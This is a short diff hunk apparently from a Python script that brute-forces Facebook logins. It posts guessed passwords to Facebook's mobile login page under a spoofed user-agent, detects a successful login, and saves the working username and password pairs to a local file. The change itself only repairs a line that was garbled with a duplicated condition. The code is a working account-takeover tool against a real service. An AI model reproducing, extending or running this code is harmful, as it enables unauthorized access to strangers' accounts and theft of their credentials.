@@ -330,7 +330,7 @@ def pilih_passxd():
                                                                                         rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
                                                                                         xo = rex.content
                                                                                         if 'mbasic_logout_button' in xo or 'save-device' in xo:
-                                                                                                print '\x1b[0;32m   [OK] '+user+' • '+pass5+' • '+tl                                                                                if 'mbasic_logout_button' in xo or 'save-device' in xo:
+                                                                                                print '\x1b[0;32m   [OK] '+user+' • '+pass5+' • '+tl
                                                                                                 oke = open('done/Indo.txt', 'a')
                                                                                                 oke.write('\n[OK] '+user+' • '+pass5)
                                                                                                 oke.close()
